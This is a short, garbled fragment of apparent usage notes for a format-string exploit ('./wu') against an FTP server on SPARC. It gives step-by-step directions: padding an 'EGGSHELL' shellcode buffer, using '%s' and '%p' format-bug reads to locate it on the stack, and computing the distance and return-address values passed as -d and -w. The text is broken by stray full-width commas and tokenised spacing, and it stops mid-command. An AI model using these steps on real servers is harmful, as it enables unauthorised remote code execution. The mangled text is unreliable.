Align this with pad to have EGGSHELL on a ， 4 bytes boundary ( -p ) . Localhost needs 2 bytes , for example. ， Use '%s' format bug exploitation to look for this string in memory. ，  ( you have to eat 15 words out of stack ) . ， Remove 0xfdc + len ( -HOSTNAME : anonymous/pad ) to your found pointer. ， This substracted value is kept as the distance ( -d ) . ， Result is your return address position ( -w ) . Check it if you want. ， This code substracts 8 to this address ( sparc ret behaviour ) . ， You may use the 102th %p pointer on stack to find the string. eg : ffbef640. ， adding 0x870 to this value , I found my string. ， offset should be useless. site_padding depends on the '/bin/ftp-exec/' ， config stuff. ，  ( ./wu -p 2 -d 0xff4 ; ",
